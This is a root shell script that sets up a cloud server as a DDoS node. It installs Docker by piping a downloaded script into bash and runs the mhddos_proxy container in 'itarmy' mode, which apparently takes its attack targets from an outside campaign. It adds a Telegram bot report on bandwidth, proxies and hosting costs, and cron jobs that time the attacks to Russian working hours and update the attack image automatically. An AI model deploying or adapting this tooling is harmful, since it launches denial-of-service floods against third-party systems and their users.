#!/bin/sh

apt-get install -y jq

wget -O - https://get.docker.com/ | bash

systemctl enable docker.service
systemctl start docker.service

mkdir -p /root/.docker/cli-plugins
curl -SL https://github.com/docker/compose/releases/download/v2.2.3/docker-compose-linux-x86_64 -o /root/.docker/cli-plugins/docker-compose
chmod +x /root/.docker/cli-plugins/docker-compose

cd /root/

echo "
version: \"3\"
services:
  mhddos:
    image: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
    restart: unless-stopped
    command:
        - \"--itarmy\"
        - \"--table\"
" > docker-compose.yaml
docker compose up -d

echo "
TG_TOKEN=\"YOUR TELEGRAM TOKEN\"
TG_CHAT_ID=\"YOUR TELEGRAM CHAT ID\"
DIGITALOCEAN_TOKEN=\"YOUR DIGITALOCEAN TOKEN\"

HOST_ID=\$(curl -s http://169.254.169.254/metadata/v1/id)
FIVEMINAGO=\$(date +%s -d '-5 minutes')
NOW=\$(date +%s)

BD_IN_RESPONSE=\$(curl -s -X GET \
  -H \"Content-Type: application/json\" \
  -H \"Authorization: Bearer \$DIGITALOCEAN_TOKEN\" \
  \"https://api.digitalocean.com/v2/monitoring/metrics/droplet/bandwidth?host_id=\$HOST_ID&interface=public&direction=inbound&start=\$FIVEMINAGO&end=\$NOW\")

BD_OUT_RESPONSE=\$(curl -s -X GET \
  -H \"Content-Type: application/json\" \
  -H \"Authorization: Bearer \$DIGITALOCEAN_TOKEN\" \
  \"https://api.digitalocean.com/v2/monitoring/metrics/droplet/bandwidth?host_id=\$HOST_ID&interface=public&direction=outbound&start=\$FIVEMINAGO&end=\$NOW\")

BAL_RESPONSE=\$(curl -s -X GET \
  -H \"Content-Type: application/json\" \
  -H \"Authorization: Bearer \$DIGITALOCEAN_TOKEN\" \
  \"https://api.digitalocean.com/v2/customers/my/balance\")

PROXY=\$(docker compose logs --tail=1000 | grep -A 5 \"ascend-cinnamon/mhddos_proxy\" | tail -n 1 | grep -o -e \": [0-9]*\" | sed 's/[^0-9]*//g')
STATS=\$(docker compose logs -t --tail=1000 | awk '!seen[\$5, \$7]++' | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}.*' | sed -e 's/[^[:digit:].-kMbit/s]/|/g' | tr -s '|' ' ' | sed 's/ /:/' | cut -d' ' -f 1,4,5,6 | sed 's/ /, /2' | sed -e 's/ / (/1' -e 's/$/\)/' | sort -k 3 -n | sed 's/\/s//g' | sed 's/ //3')

DB_IN=\$(echo \$BD_IN_RESPONSE | jq '.data.result[].values[-1][1]' | bc -l | xargs printf \"%.2f\")
DB_OUT=\$(echo \$BD_OUT_RESPONSE | jq '.data.result[].values[-1][1]' | bc -l | xargs printf \"%.2f\")
BAL_BAL=\$(echo \$BAL_RESPONSE | jq '.month_to_date_balance' | bc)
BAL_USG=\$(echo \$BAL_RESPONSE | jq '.month_to_date_usage' | bc)

message=\"*Host*: \$(hostname)\"
message+=\"%0A\"
message+=\"*Balance/To pay*: \$BAL_BAL/\$BAL_USG\"
message+=\"%0A\"
message+=\"*Proxy count*: \$PROXY\"
message+=\"%0A\"
message+=\"*Outbound*: \$DB_OUT Mb/s\"
message+=\"%0A\"
message+=\"*Inbound*: \$DB_IN Mb/s\"
message+=\"%0A\"
message+=\"*Latest stats*:\"
message+=\"%0A\"
message+=\"\$STATS\"

curl -s --data \"text=\${message}\" \
        --data \"chat_id=\$TG_CHAT_ID\" \
        --data \"parse_mode=markdown\" \
        \"https://api.telegram.org/bot\${TG_TOKEN}/sendMessage\"
" > tg.sh

chmod u+x tg.sh

echo "# 22:00 - 05:00 UTC is 01:00 - 08:00 RU" > crontab
echo "0 22 * * * cd /root && docker compose down" >> cronjob
echo "0 5 * * * cd /root && docker compose up -d" >> cronjob
echo "15 7-20/2 * * * cd /root && docker compose down && docker compose pull && docker compose up -d" >> cronjob
echo "@reboot cd /root && docker compose down && docker compose pull && docker compose up -d" >> cronjob
echo "0 7-20/4 * * * cd /root/ && /bin/bash tg.sh > tg.log 2>&1" >> cronjob
crontab cronjob
